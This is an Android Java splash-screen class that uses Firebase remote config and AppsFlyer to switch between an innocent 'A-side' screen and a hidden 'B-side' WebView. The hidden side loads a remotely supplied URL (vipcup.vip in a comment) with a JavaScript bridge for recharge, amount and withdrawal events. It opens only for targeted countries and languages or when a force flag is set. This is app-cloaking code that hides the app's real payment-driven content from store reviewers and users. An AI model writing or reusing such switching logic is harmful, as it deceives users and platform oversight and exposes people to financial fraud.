package com.asdaaops.padot.bee3test;


import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.appsflyer.attribution.AppsFlyerRequestListener;
import com.ashdot.safeount.R;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

import java.util.Locale;
import java.util.Map;

public class SplashActivity extends AppCompatActivity {
    String TAG = "SplashActivity";
    Context context;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);
        context = this;
        //跳转
        FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600 * 24 * 55)//2次成功拉取配置时间间隔：20天
                //.setMinimumFetchIntervalInSeconds(0)
                .build();
        mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
        mFirebaseRemoteConfig.fetchAndActivate().addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
            @Override
            public void onComplete(@NonNull Task<Boolean> task) {
                try {
                    //7hSagQeAvVXrtRVMNbEMZG$$https://vipcup.vip/?id=57805076$$jsBridge$$openWindow$$firstrecharge$$recharge$$amount$$currency$$withdrawOrderSuccess$$cn$$zh$$true
                    String datas = mFirebaseRemoteConfig.getString("kdopw");
                    //Log.d(TAG, "datas=" + datas);
                    if (!TextUtils.isEmpty(datas)) {
                        String[] datasArray = datas.split("\\$\\$");
                        //Log.d(TAG, "datasArray =" + datasArray.length);
                        AppsFlyerLib.getInstance().setMinTimeBetweenSessions(0);
                        AppsFlyerLib.getInstance().setDebugLog(true);

                        // app flay初始化
                        AppsFlyerLib.getInstance().init(datasArray[0], new AppsFlyerConversionListener() {
                            @Override
                            public void onConversionDataSuccess(Map<String, Object> map) {
                                //   map={install_time=2023-09-25 13:27:12.578, af_status=Organic, af_message=organic install, is_first_launch=true}
                                //  Log.d(TAG, "onConversionDataSuccess map=" + map);
                            }

                            @Override
                            public void onConversionDataFail(String s) {
                                //Log.d(TAG, "onConversionDataFail=" + s);

                            }

                            @Override
                            public void onAppOpenAttribution(Map<String, String> map) {
                                //Log.d(TAG, "onAppOpenAttribution=" + map);

                            }

                            @Override
                            public void onAttributionFailure(String s) {
                                //Log.d(TAG, "onAttributionFailure=" + s);

                            }
                        }, getApplicationContext());

                        AppsFlyerLib.getInstance().start(getApplicationContext(), datasArray[0], new AppsFlyerRequestListener() {
                            @Override
                            public void onSuccess() {
                                //Log.d(TAG, "Launch sent successfully, got 200 response code from server");
                            }

                            @Override
                            public void onError(int i, @NonNull String s) {
                                //Log.d(TAG, "Launch failed to be sent:\n" + "Error code: " + i + "\n" + "Error description: " + s);
                            }
                        });
                        //2
                        BWeb1.loadUrl = datasArray[1];///mFirebaseRemoteConfig.getString(pre + "1");
                        BWeb1.jsBridgeObjName = datasArray[2];//bridge
                        //Log.d(TAG, "loadUrl=" + CrossyroadPrivacyType1.loadUrl);
                        //Log.d(TAG, "jsBridgeObjName=" + jsBridgeObjName);
                        //6个
                        BWeb1.openWindow = datasArray[3]; ///mFirebaseRemoteConfig.getString(pre + "3");
                        BWeb1.firstrecharge = datasArray[4];// mFirebaseRemoteConfig.getString(pre + "4");
                        BWeb1.recharge = datasArray[5];// mFirebaseRemoteConfig.getString(pre + "5");
                        BWeb1.amount = datasArray[6];// mFirebaseRemoteConfig.getString(pre + "6");
                        BWeb1.currency = datasArray[7]; //mFirebaseRemoteConfig.getString(pre + "7");
                        BWeb1.withdrawOrderSuccess = datasArray[8]; //mFirebaseRemoteConfig.getString(pre + "8");


                        TelephonyManager tm = (TelephonyManager) SplashActivity.this.getSystemService(TELEPHONY_SERVICE);

                        String f_countryCodeValue = datasArray[9]; ///mFirebaseRemoteConfig.getString(pre + "9");
                        String f_localeLanguage = datasArray[10];///mFirebaseRemoteConfig.getString(pre + "10");
                        boolean force = Boolean.parseBoolean(datasArray[11]); ////mFirebaseRemoteConfig.getBoolean(pre + "11");


                        String countryCodeValue = tm.getNetworkCountryIso();
                        Locale locale = getResources().getConfiguration().locale;
                        String localeLanguage = locale.getLanguage();
                        if ((f_countryCodeValue.contains(countryCodeValue)
                                && f_localeLanguage.contains(localeLanguage)) || force
                        ) {
                            ///    Toast.makeText(SplashActivity.this, "B面 loadUrl=" + CrossyroadPrivacyType1.loadUrl, Toast.LENGTH_LONG).show();
                            Intent intent = new Intent(context, BWeb1.class);
                            startActivity(intent);
                            finish();
                        }
                    } else {
                        //先不做归因，直接接口返回有值，就跳转；没值就A面
                        Intent intent = new Intent(context, AActivity.class);
                        startActivity(intent);
                        finish();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }
}
